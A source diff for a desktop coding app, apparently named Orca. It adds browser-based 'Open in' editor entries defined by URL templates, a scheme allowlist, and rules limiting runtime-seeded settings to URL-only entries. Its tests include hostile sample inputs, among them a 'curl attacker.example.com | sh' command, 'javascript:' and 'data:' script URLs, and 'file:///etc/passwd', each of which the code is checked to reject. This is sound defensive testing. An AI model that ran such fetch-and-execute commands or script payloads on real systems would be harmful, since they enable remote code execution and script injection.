@@ -1,0 +1,415 @@
+diff --git a/src/renderer/src/components/sidebar/WorktreeOpenInMenu.tsx b/src/renderer/src/components/sidebar/WorktreeOpenInMenu.tsx
+index 0d6cf3245..93637a564 100644
+--- a/src/renderer/src/components/sidebar/WorktreeOpenInMenu.tsx
++++ b/src/renderer/src/components/sidebar/WorktreeOpenInMenu.tsx
+@@ -13,6 +13,7 @@ import { isLocalPathOpenBlocked, showLocalPathOpenBlockedToast } from '@/lib/loc
+ import { getLocalFileManagerLabel } from '@/lib/local-file-manager-label'
+ import { OpenInApplicationIcon } from '@/lib/open-in-app-catalog'
+ import { getExternalEditorOpenCapability } from '@/lib/external-editor-open-capability'
++import { resolveOpenInUrl } from '../../../../shared/open-in-url-template'
+ import type { ShellOpenExternalEditorResult } from '../../../../shared/shell-open-types'
+ import type { GlobalSettings, OpenInApplication } from '../../../../shared/types'
+ import { translate } from '@/i18n/i18n'
+@@ -31,6 +32,7 @@ export type OpenInMenuEntry = {
+   label: string
+   target: 'external-editor' | 'file-manager'
+   command?: string
++  url?: string
+ }
+ 
+ export function getWorktreeOpenInEntries(
+@@ -42,7 +44,8 @@ export function getWorktreeOpenInEntries(
+       id: application.id,
+       label: application.label,
+       target: 'external-editor' as const,
+-      command: application.command
++      command: application.command,
++      url: application.url
+     })),
+     { id: 'file-manager', label: fileManagerLabel, target: 'file-manager' }
+   ]
+@@ -64,7 +67,8 @@ export function getOpenInEntryAvailability(
+   }
+   const capability = getExternalEditorOpenCapability(settings, {
+     connectionId,
+-    command: entry.command
++    command: entry.command,
++    url: entry.url
+   })
+   if (!capability.allowed) {
+     return {
+@@ -245,8 +249,26 @@ export async function openWorktreePath(args: {
+   worktreePath: string
+   connectionId?: string | null
+   command?: string
++  url?: string
+ }): Promise<void> {
+   const settings = useAppStore.getState().settings
++  // Why this runs before every guard below: a URL entry never touches the local OS. The path is
++  // handed to whoever serves that URL — typically the same host the worktree lives on — so the
++  // local/remote reasoning the guards encode simply does not apply.
++  if (args.target === 'external-editor' && args.url?.trim()) {
++    const resolved = resolveOpenInUrl(args.url, args.worktreePath)
++    if (!resolved) {
++      toast.error(
++        translate(
++          'auto.components.sidebar.WorktreeOpenInMenu.openInUrlInvalid',
++          'That app has an invalid URL.'
++        )
++      )
++      return
++    }
++    await window.api.shell.openUrl(resolved)
++    return
++  }
+   if (args.target === 'file-manager') {
+     if (isLocalPathOpenBlocked(settings, { connectionId: args.connectionId ?? null })) {
+       showLocalPathOpenBlockedToast()
+@@ -255,7 +277,8 @@ export async function openWorktreePath(args: {
+   } else {
+     const capability = getExternalEditorOpenCapability(settings, {
+       connectionId: args.connectionId,
+-      command: args.command
++      command: args.command,
++      url: args.url
+     })
+     if (!capability.allowed) {
+       if (capability.reason === 'remote-runtime') {
+@@ -285,11 +308,12 @@ function useOpenInWorktreePath({
+   connectionId
+ }: WorktreeOpenInMenuItemsProps): (
+   target: 'file-manager' | 'external-editor',
+-  command?: string
++  command?: string,
++  url?: string
+ ) => Promise<void> {
+   return useCallback(
+-    async (target, command) => {
+-      await openWorktreePath({ target, worktreePath, connectionId, command })
++    async (target, command, url) => {
++      await openWorktreePath({ target, worktreePath, connectionId, command, url })
+     },
+     [connectionId, worktreePath]
+   )
+@@ -316,14 +340,17 @@ export function WorktreeOpenInMenuItems({
+             key={entry.id}
+             onClick={stopMenuPropagation}
+             onSelect={() => {
+-              void openInWorktreePath(entry.target, entry.command)
++              void openInWorktreePath(entry.target, entry.command, entry.url)
+             }}
+             disabled={disabled || availability.disabled}
+           >
+             {entry.target === 'file-manager' ? (
+               <FolderOpen className="size-3.5" />
+-            ) : entry.command ? (
+-              <OpenInApplicationIcon application={{ command: entry.command }} size={14} />
++            ) : entry.command || entry.url ? (
++              <OpenInApplicationIcon
++                application={{ id: entry.id, command: entry.command ?? '', url: entry.url }}
++                size={14}
++              />
+             ) : (
+               <ExternalLink className="size-3.5" />
+             )}
+diff --git a/src/renderer/src/lib/external-editor-open-capability.ts b/src/renderer/src/lib/external-editor-open-capability.ts
+index bab7547b9..eb08dee5e 100644
+--- a/src/renderer/src/lib/external-editor-open-capability.ts
++++ b/src/renderer/src/lib/external-editor-open-capability.ts
+@@ -7,8 +7,15 @@ export type ExternalEditorOpenCapability =
+ 
+ export function getExternalEditorOpenCapability(
+   settings: Pick<GlobalSettings, 'activeRuntimeEnvironmentId'> | null | undefined,
+-  context: { connectionId?: string | null; command?: string }
++  context: { connectionId?: string | null; command?: string; url?: string }
+ ): ExternalEditorOpenCapability {
++  // Why URL entries skip every check below: the guards exist because `command` spawns a process
++  // on THIS machine against a path that belongs to another one. A URL has neither problem — it is
++  // navigation, and the host that owns the path is the one serving it. Blocking these is what
++  // leaves a remote runtime with no way to open a worktree in an editor at all.
++  if (context.url?.trim()) {
++    return { allowed: true, remote: false }
++  }
+   if (settings?.activeRuntimeEnvironmentId?.trim()) {
+     return { allowed: false, reason: 'remote-runtime' }
+   }
+diff --git a/src/renderer/src/lib/open-in-app-catalog.tsx b/src/renderer/src/lib/open-in-app-catalog.tsx
+index ea54d1d24..77ff9131a 100644
+--- a/src/renderer/src/lib/open-in-app-catalog.tsx
++++ b/src/renderer/src/lib/open-in-app-catalog.tsx
+@@ -36,13 +36,48 @@ export const getOpenInAppPresets = createLocalizedCatalog(() => [
+   }
+ ])
+ 
++/**
++ * Favicon domains for URL entries, keyed by the entry's stable `id`.
++ *
++ * Why keyed on id and not on the URL's own host: that host carries a deployment-chosen slug
++ * (`code-server--<workspace>--<owner>.<domain>`) and is usually a private domain a favicon
++ * service cannot reach. The id is the one stable thing the entry's author controls.
++ *
++ * Why they all borrow VS Code's mark: code-server and vscode-web ARE VS Code in a browser, and
++ * neither has a usable icon of its own — `code-server.dev` redirects to GitHub, so a favicon
++ * lookup there returns the octocat. The editor's mark says more to the user than the host's.
++ *
++ * Kept separate from getOpenInAppPresets() on purpose: those double as the "Add app" dropdown,
++ * where every option must contribute a runnable command. A URL entry has none.
++ */
++const URL_OPEN_IN_APP_FAVICON_DOMAINS: Readonly<Record<string, string>> = {
++  'code-server': 'code.visualstudio.com',
++  'vscode-web': 'code.visualstudio.com',
++  vscode: 'code.visualstudio.com',
++  cursor: 'cursor.com'
++}
++
+ export function getOpenInAppPreset(
+   application: Pick<OpenInApplication, 'command'>
+ ): OpenInAppPreset | null {
+   const command = application.command.trim().toLowerCase()
++  if (!command) {
++    return null
++  }
+   return getOpenInAppPresets().find((preset) => preset.command === command) ?? null
+ }
+ 
++/** Favicon domain for a URL entry, or null when its id has no known mark. */
++export function getOpenInUrlFaviconDomain(
++  application: Partial<Pick<OpenInApplication, 'id' | 'url'>>
++): string | null {
++  const id = application.id?.trim().toLowerCase()
++  if (!application.url?.trim() || !id) {
++    return null
++  }
++  return URL_OPEN_IN_APP_FAVICON_DOMAINS[id] ?? null
++}
++
+ export function isOpenInAppPresetAdded(
+   applications: readonly Pick<OpenInApplication, 'command'>[],
+   preset: OpenInAppPreset
+@@ -56,19 +91,20 @@ export function OpenInApplicationIcon({
+   application,
+   size = 14
+ }: {
+-  application: Pick<OpenInApplication, 'command'>
++  application: Pick<OpenInApplication, 'command'> & Partial<Pick<OpenInApplication, 'id' | 'url'>>
+   size?: number
+ }): React.JSX.Element {
+   const preset = getOpenInAppPreset(application)
+-  if (preset) {
++  const faviconDomain = preset?.faviconDomain ?? getOpenInUrlFaviconDomain(application)
++  if (faviconDomain) {
+     return (
+       <img
+-        src={`https://www.google.com/s2/favicons?domain=${preset.faviconDomain}&sz=64`}
++        src={`https://www.google.com/s2/favicons?domain=${faviconDomain}&sz=64`}
+         width={size}
+         height={size}
+         alt=""
+         aria-hidden
+-        className={cn('shrink-0', preset.iconClassName)}
++        className={cn('shrink-0', preset?.iconClassName)}
+         style={{ borderRadius: 2 }}
+       />
+     )
+diff --git a/src/shared/open-in-url-template.test.ts b/src/shared/open-in-url-template.test.ts
+new file mode 100644
+index 000000000..b4a9bcee1
+--- /dev/null
++++ b/src/shared/open-in-url-template.test.ts
+@@ -0,0 +1,52 @@
++import { describe, expect, it } from 'vitest'
++import { resolveOpenInUrl } from './open-in-url-template'
++
++const WORKTREE = '/home/coder/orca/workspaces/my-feature'
++
++describe('resolveOpenInUrl', () => {
++  it('substitutes the worktree path, URL-encoded', () => {
++    expect(resolveOpenInUrl('https://code-server.example.com/?folder={path}', WORKTREE)).toBe(
++      'https://code-server.example.com/?folder=%2Fhome%2Fcoder%2Forca%2Fworkspaces%2Fmy-feature'
++    )
++  })
++
++  it('substitutes every occurrence', () => {
++    expect(resolveOpenInUrl('https://e.com/{path}?folder={path}', '/a b')).toBe(
++      'https://e.com/%2Fa%20b?folder=%2Fa%20b'
++    )
++  })
++
++  it('encodes characters that would otherwise break out of the query', () => {
++    const resolved = resolveOpenInUrl('https://e.com/?folder={path}', '/tmp/x&y=z#frag')
++    expect(resolved).toBe('https://e.com/?folder=%2Ftmp%2Fx%26y%3Dz%23frag')
++  })
++
++  it('leaves a template without the placeholder alone', () => {
++    expect(resolveOpenInUrl('https://e.com/fixed', WORKTREE)).toBe('https://e.com/fixed')
++  })
++
++  // Why: these templates can come from the runtime's settings store, which a host operator seeds.
++  // A non-web scheme would turn a menu click into script execution in the client.
++  it('refuses javascript: and data: URLs', () => {
++    expect(resolveOpenInUrl('javascript:alert(1)//{path}', WORKTREE)).toBeNull()
++    expect(resolveOpenInUrl('data:text/html,<script>alert(1)</script>', WORKTREE)).toBeNull()
++  })
++
++  it('refuses non-web schemes even when they parse', () => {
++    expect(resolveOpenInUrl('file:///etc/passwd', WORKTREE)).toBeNull()
++    expect(resolveOpenInUrl('vscode://coder.coder-remote/open?folder={path}', WORKTREE)).toBeNull()
++  })
++
++  it('accepts http as well as https', () => {
++    expect(resolveOpenInUrl('http://localhost:8080/?folder={path}', '/x')).toBe(
++      'http://localhost:8080/?folder=%2Fx'
++    )
++  })
++
++  it('returns null for unusable templates instead of throwing', () => {
++    expect(resolveOpenInUrl(undefined, WORKTREE)).toBeNull()
++    expect(resolveOpenInUrl('', WORKTREE)).toBeNull()
++    expect(resolveOpenInUrl('   ', WORKTREE)).toBeNull()
++    expect(resolveOpenInUrl('not a url', WORKTREE)).toBeNull()
++  })
++})
+diff --git a/src/shared/open-in-url-template.ts b/src/shared/open-in-url-template.ts
+new file mode 100644
+index 000000000..742f3ad01
+--- /dev/null
++++ b/src/shared/open-in-url-template.ts
+@@ -0,0 +1,45 @@
++/** Substituted with the worktree's absolute path, URL-encoded. */
++export const OPEN_IN_URL_PATH_PLACEHOLDER = '{path}'
++
++/**
++ * Resolve an "Open in" URL template against a worktree path.
++ *
++ * Why templates at all: a `command` entry spawns a local process, which is meaningless when the
++ * worktree lives on another machine — the runtime blocks those, correctly, for remote runtimes.
++ * A browser-based editor served by the same host has no such problem: it is just a URL that
++ * happens to take the path as a query parameter, e.g.
++ *
++ *   https://code-server--<workspace>--<owner>.<wildcard>/?folder={path}
++ *
++ * Keeping this as an opaque template is deliberate. Deployment-specific knowledge — the app's
++ * slug, the wildcard domain, whether it is even reachable — belongs to whoever provisions the
++ * host, not to Orca. Orca only learns to open a link.
++ *
++ * Returns null when the template is unusable, so a bad entry renders disabled instead of
++ * throwing at click time.
++ */
++export function resolveOpenInUrl(template: string | undefined, path: string): string | null {
++  const trimmed = template?.trim()
++  if (!trimmed) {
++    return null
++  }
++  const substituted = trimmed.split(OPEN_IN_URL_PATH_PLACEHOLDER).join(encodeURIComponent(path))
++  let parsed: URL
++  try {
++    parsed = new URL(substituted)
++  } catch {
++    return null
++  }
++  // Why an explicit scheme allowlist: these templates can arrive from the runtime's own settings
++  // store, which a host operator seeds. `javascript:` or `data:` here would turn a menu click
++  // into script execution in the client, so anything but plain web navigation is refused.
++  if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
++    return null
++  }
++  return parsed.toString()
++}
++
++/** True when this entry opens a URL rather than spawning a local command. */
++export function isOpenInUrlEntry(entry: { url?: string }): boolean {
++  return Boolean(entry.url?.trim())
++}
+diff --git a/src/shared/runtime-seeded-settings.test.ts b/src/shared/runtime-seeded-settings.test.ts
+index 1317247ce..da2b8b1aa 100644
+--- a/src/shared/runtime-seeded-settings.test.ts
++++ b/src/shared/runtime-seeded-settings.test.ts
+@@ -65,6 +65,42 @@ describe('runtime-seeded settings', () => {
+     expect(picked).toEqual({ agentHibernationIdleMs: 60_000 })
+   })
+ 
++  // Why these three: a seeded Open In entry travels runtime -> client. A `command` entry is a
++  // shell command a desktop client executes, so honouring one would let whoever writes the
++  // runtime's store hand a client something to run. Only URL entries may cross.
++  it('seeds URL-only Open In entries, with command forced empty', () => {
++    const picked = pickRuntimeSeededSettings({
++      openInApplications: [
++        { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' }
++      ]
++    })
++    expect(picked.openInApplications).toEqual([
++      {
++        id: 'code-server',
++        label: 'code-server',
++        url: 'https://cs.example.com/?folder={path}',
++        command: ''
++      }
++    ])
++  })
++
++  it('refuses the whole list when any entry carries a command', () => {
++    const picked = pickRuntimeSeededSettings({
++      openInApplications: [
++        { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' },
++        { id: 'evil', label: 'Evil', command: 'curl attacker.example.com | sh' }
++      ]
++    })
++    expect(picked.openInApplications).toBeUndefined()
++  })
++
++  it('refuses an entry with neither url nor the required fields', () => {
++    expect(
++      pickRuntimeSeededSettings({ openInApplications: [{ id: 'x', label: 'X' }] })
++        .openInApplications
++    ).toBeUndefined()
++  })
++
+   it('skips absent keys so an older runtime leaves stock defaults alone', () => {
+     expect(pickRuntimeSeededSettings({ theme: undefined })).toEqual({})
+   })
+diff --git a/src/shared/runtime-seeded-settings.ts b/src/shared/runtime-seeded-settings.ts
+index b17b6f1b0..eb0e94df1 100644
+--- a/src/shared/runtime-seeded-settings.ts
++++ b/src/shared/runtime-seeded-settings.ts
+@@ -50,7 +50,24 @@ export const RUNTIME_SEEDED_SETTING_SCHEMA = {
+   experimentalPet: z.boolean(),
+   experimentalTerminalAttention: z.boolean(),
+   experimentalMobile: z.boolean(),
+-  mobileEmulatorEnabled: z.boolean()
++  mobileEmulatorEnabled: z.boolean(),
++
++  // ── Open In entries — URL templates only, never commands ──────────────────
++  // Why the `command` field is dropped rather than validated: a command entry is a shell
++  // command a DESKTOP client executes. Seeding travels runtime -> client, so honouring one here
++  // would let whoever writes the runtime's store hand a client something to run. A URL entry
++  // cannot do that, and it is the only kind a remote runtime has any use for. `.strict()` makes
++  // an entry carrying `command` fail its schema and get dropped, rather than silently stripped.
++  openInApplications: z.array(
++    z
++      .object({
++        id: z.string().min(1),
++        label: z.string().min(1),
++        url: z.string().min(1)
++      })
++      .strict()
++      .transform((entry) => ({ ...entry, command: '' }))
++  )
+ } satisfies Partial<Record<keyof GlobalSettings, z.ZodTypeAny>>
+ 
+ export type RuntimeSeededSettingKey = keyof typeof RUNTIME_SEEDED_SETTING_SCHEMA
+diff --git a/src/shared/types.ts b/src/shared/types.ts
+index 32f3f4731..8afd9c08b 100644
+--- a/src/shared/types.ts
++++ b/src/shared/types.ts
+@@ -2570,6 +2570,11 @@ export type OpenInApplication = {
+   id: string
+   label: string
+   command: string
++  /** When set, the entry opens this URL instead of spawning `command`. `{path}` is replaced with
++   *  the worktree's absolute path, URL-encoded. Lets a remote runtime offer a browser-based
++   *  editor (code-server, vscode-web, …) that `command` entries cannot reach — see
++   *  `shared/open-in-url-template.ts`. */
++  url?: string
+ }
+ 
+ export type SourceControlViewMode = 'list' | 'tree'
